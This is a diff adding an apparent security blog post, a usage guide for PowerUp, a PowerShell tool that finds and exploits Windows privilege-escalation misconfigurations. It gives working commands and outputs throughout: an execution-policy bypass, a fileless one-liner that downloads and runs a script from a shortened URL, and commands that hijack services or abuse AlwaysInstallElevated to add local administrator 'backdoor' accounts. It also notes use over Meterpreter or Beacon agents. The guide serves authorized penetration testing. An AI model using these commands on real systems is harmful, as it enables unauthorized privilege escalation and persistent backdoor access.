@@ -1,0 +1,71 @@
+<p><strong style="color: #404040;">Note:</strong><span style="color: #404040;"> this topic was cross-posted on the official </span><a style="color: #a45e0f;" href="http://www.verisgroup.com/2014/06/17/powerup-usage/">Veris Group blog</a>.</p>
+<p><a href="http://www.harmj0y.net/blog/powershell/powerup/">PowerUp</a> is the result of wanting a clean way to audit client systems for common Windows privilege escalation vectors. It utilizes various service abuse checks, .dll hijacking opportunities, registry checks, and more to enumerate common ways that you might be able to elevate on a target system. We&#8217;ve gotten the chance to test PowerUp in multiple environments, as well integrate public feedback, so I wanted to put together a quick usage guide for those wanting to check it out.</p>
+<p>To load up PowerUp, first download the <a href="https://raw.githubusercontent.com/HarmJ0y/PowerUp/master/PowerUp.ps1">raw script</a> to a local location, and then launch Powershell:</p>
+<ul>
+<li>C:&gt; powershell.exe -nop -exec bypass</li>
+</ul>
+<p>Then import the PowerUp module with the following:</p>
+<ul>
+<li>PS C:\&gt;<strong> Import-Module PowerUp.ps1</strong></li>
+</ul>
+<p>All of the PowerUp cmdlets will now be exposed and tab completable (Get-[tab]). To get more information on any command, use get-help [cmdlet], with an optional -full flag to return complete information. I.E. &#8220;<strong>Get-Help Get-ServiceEXEPerms -full</strong>&#8220;. To get a list of all the available functions, check the <a href="https://github.com/HarmJ0y/PowerUp/blob/master/README.md">README.md</a>. If you want to output your results to a file, I recommend using the Powershell Out-File cmdlet, I.E. ​&#8221;PS C:\&gt; <strong>Get-ServicePerms | Out-File -Encoding ASCII checks.txt</strong>&#8221; (the -encoding flag is used since since Powershell defaults to Unicode).</p>
+<p>The most common way I end up using PowerUp is by using the <strong>Invoke-AllChecks </strong>function, which runs through all relevant checks for the machine and outputs a status report:</p>
+<ul>
+<li>PS C:\&gt; <strong>Invoke-AllChecks</strong> | <strong>Out-File -Encoding ASCII checks.txt</strong></li>
+</ul>
+<p>Sidenote: there are a few other ways you can run the <strong>Invoke-AllChecks</strong> functionality in the field, particularly over a Meterpreter (or Beacon) agent. One option is to upload the PowerUp.ps1 script to the machine, drop into a shell, and execute the following command:</p>
+<ul>
+<li>C:\&gt; powershell.exe -exec bypass -Command &#8220;&amp; {Import-Module .\PowerUp.ps1; Invoke-AllChecks}&#8221;</li>
+</ul>
+<p>If you want to invoke everything without touching disk, use something like this:</p>
+<ul>
+<li>C:\&gt; powershell -nop -exec bypass -c &#8220;IEX (New-Object Net.WebClient).DownloadString(&#8216;http://bit.ly/1mK64oH&#8217;); Invoke-AllChecks&#8221;</li>
+</ul>
+<p class="p1">There&#8217;s also a Metasploit module for running powershell commands through a session, <a href="https://github.com/rapid7/metasploit-framework/blob/master/modules/post/windows/manage/powershell/exec_powershell.rb"><span class="s1">post/windows/manage/powershell/exec_powershell</span></a>. Before you use this module, first append &#8220;Invoke-AllChecks&#8221; to the end of PowerUp.ps1 on your attacker machine, and then specify the local path to the script in the module options. Metasploit will upload the script, run it on the target, retrieve the results and save them back to your local machine.</p>
+<p>Now, let&#8217;s take a look at that example report:</p>
+<pre>Running Invoke-AllChecks
+Checking for unquoted service paths...
+[+] Unquoted service path: CustomSVC - C:\Users\adam\Documents\Visual Studio 2008\Projects\Service\Service\bin\Release\service.exe
+Checking service executable permissions...
+[+] Vulnerable service executable: CustomSVC - C:\Users\adam\Documents\Visual Studio 2008\Projects\Service\Service\bin\Release\service.exe
+Checking service permissions...
+[+] Vulnerable service: CustomAPP - C:\Custom\deploy.exe
+Checking for unattended install files...
+[+] Unattended install file: C:\Windows\Panther\Unattended.xml
+Checking %PATH% for potentially hijackable service .dll locations...
+Checking for AlwaysInstallElevated registry key...
+[+] AlwaysInstallElevated is enabled for this machine!
+Checking for Autologon credentials in registry...
+</pre>
+<p>We definitely have some interesting output to check out here. The first thing I could check out is the unattended installation file at C:\Windows\Panther\Unattended.xml- this file might have a base64-encoded deployment password that would give us a quick win.</p>
+<p>The next up is the vulnerable service executable. This misconfiguration happens when the executable associated with a service has improper permissions, allowing other users to write to the .exe. Since these services run as SYSTEM, if we replace the exe with our own, we can escalate quickly. PowerUp includes a function to easily back up the service .exe and write out a patched C# service to that service location. If it succeeds, it returns <strong>True</strong>, and returns <strong>False</strong> if it fails. We can use the -Verbose flag to get some more information:</p>
+<ul>
+<li>PS C:\&gt; <strong>Write-ServiceEXE -ServiceName CustomSVC -UserName backdoor -Password password123 -Verbose</strong><br />
+VERBOSE: Backing up &#8216;C:\Users\adam\Documents\Visual Studio 2008\Projects\Service\Service\bin\Release\service.exe&#8217; to &#8216;C:\Users\adam\Documents\Visual Studio<br />
+2008\Projects\Service\Service\bin\Release\service.exe.bak&#8217;<br />
+VERBOSE: Service binary written out to &#8216;C:\Users\adam\Documents\Visual Studio 2008\Projects\Service\Service\bin\Release\service.exe&#8217;<br />
+True</li>
+</ul>
+<p>This new service binary will create a new user named backdoor, and add them to the local administrators. If we can&#8217;t start/stop the service, rebooting the box should do the trick to get the user added. After the user is added, running <b>Restore-ServiceEXE -ServiceName CustomSVC</b> should place the original binary back in its proper place.</p>
+<p>Sometimes services themselves are vulnerable- if we can modify a service and start/stop it, we can change the path name to the service exe to be something like &#8220;net user backdoor2 /add&#8221;. If we start/stop the service and then repeat that process to add the user to the local administrators, we&#8217;re golden:</p>
+<ul>
+<li>PS C:\&gt; <strong>Invoke-ServiceUserAdd -ServiceName CustomAPP -UserName backdoor2 -Password password123 -Verbose</strong><br />
+VERBOSE: Service &#8216;CustomAPP&#8217; original path: &#8216;C:\Custom\deploy.exe&#8217;<br />
+VERBOSE: Service &#8216;CustomAPP&#8217; original state: &#8216;Stopped&#8217;<br />
+VERBOSE: Adding user &#8216;backdoor2&#8217;<br />
+VERBOSE: Adding user &#8216;backdoor2&#8217; to group &#8216;Administrators&#8217;<br />
+VERBOSE: Restoring original path to service &#8216;CustomAPP&#8217;<br />
+VERBOSE: Leaving service &#8216;CustomAPP&#8217; in stopped state<br />
+True</li>
+</ul>
+<p>Finally, let&#8217;s check out that AlwaysInstallElevated key. This is a key sometimes set by enterprises in an attempt to simply the deployment of installer packages without granting users administrative rights. However, setting this key actually is the <a href="http://blogs.technet.com/b/fdcc/archive/2011/01/25/alwaysinstallelevated-is-equivalent-to-granting-administrative-rights.aspx">exact same as giving users those rights</a>, as writing out a custom .msi installer and running it will give the user elevated privileges:</p>
+<ul>
+<li>PS C:\&gt; <strong>Write-UserAddMSI</strong><br />
+Service binary written out to &#8216;UserAdd.msi&#8217;<br />
+True</li>
+</ul>
+<p>When we run this .msi, it gives us a gui to add a local admin:</p>
+<p><a href="http://www.harmj0y.net/blog/wp-content/uploads/2014/05/useradd_msi.png"><img loading="lazy" decoding="async" class="aligncenter  wp-image-160" src="http://www.harmj0y.net/blog/wp-content/uploads/2014/05/useradd_msi.png" alt="useradd_msi" width="316" height="280" srcset="https://blog.harmj0y.net/wp-content/uploads/2014/05/useradd_msi.png 580w, https://blog.harmj0y.net/wp-content/uploads/2014/05/useradd_msi-300x266.png 300w" sizes="(max-width: 316px) 100vw, 316px" /></a></p>
+<p>&nbsp;</p>
+<p>If you have any questions, hit me up at will [at] harmj0y.net, on twitter at <a href="https://twitter.com/harmj0y">@harmj0y</a>, or on Freednode (harmj0y in #veil or #armitage).</p>
+<p>&nbsp;</p>
